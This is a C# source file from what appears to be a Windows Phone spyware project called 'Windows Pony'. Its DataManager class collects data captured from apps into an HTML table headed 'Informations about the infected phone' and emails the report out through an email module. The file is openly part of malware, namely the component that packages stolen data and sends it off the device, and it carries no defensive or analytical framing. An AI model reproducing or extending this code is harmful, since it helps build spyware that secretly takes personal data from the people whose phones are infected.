using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace FinalWindowsPony.Core.Control
{
    public class DataManager
    {
        private readonly string HEADER = "<html><head></head><body><table border='1'>";
        private readonly string TITLE = "<tr> <td> {|(||)} </td>  <td> {|(||)} </td>  <td> {|(||)} </td> </tr>";
        private readonly string FOOTER = "</table></body></html>";
        private readonly string BREAKLN = "<br/>";
        private readonly string TOKEN = @"\{\|\(\|\|\)\}";
        private string BODY = "";
        private string APPNAME = "Windows Pony";
        private string APPINFO = "Informations about the infected phone";
        private string DATETIME = "";
        private Regex regex;
        private int controller = 0;

        #region PUBLIC_METHODS

        public DataManager() { regex = new Regex(this.TOKEN); }

        public Task CloseSend()
        {
            this.BindData();
            ModuleManagerFactoryPool.getEmail().Send(this.HEADER + this.BODY + this.FOOTER);
            this.BODY = "";
            return null;
        }

        public void StartAddData(string app, string data)
        {
            if (this.APPNAME != app)
            {
                this.BindData();
                this.APPNAME = app;
                this.APPINFO = data + this.BREAKLN;
                this.DATETIME = DateTime.Now.ToString("G");
            }
            else
                this.APPINFO += data + this.BREAKLN;
            this.controller++;
        }

        public int getController()
        {
            return this.controller;
        }

        #endregion


        #region PRIVATE_METHODS

        private void BindData()
        {
            string aux = this.TITLE;
            aux = this.ReplaceFirst(aux, this.APPNAME);
            aux = this.ReplaceFirst(aux, this.APPINFO);
            aux = this.ReplaceFirst(aux, this.DATETIME);
            this.BODY += aux;
            this.EraseStrings();
        }

        private void EraseStrings()
        {
            this.DATETIME = "";
            this.APPINFO = "Informations about the infected phone";
            this.APPNAME = "Windows Pony";
        }

        private string ReplaceFirst(string target, string replace)
        {
            return this.regex.Replace(target, replace, 1);
        }
        #endregion
    }
}
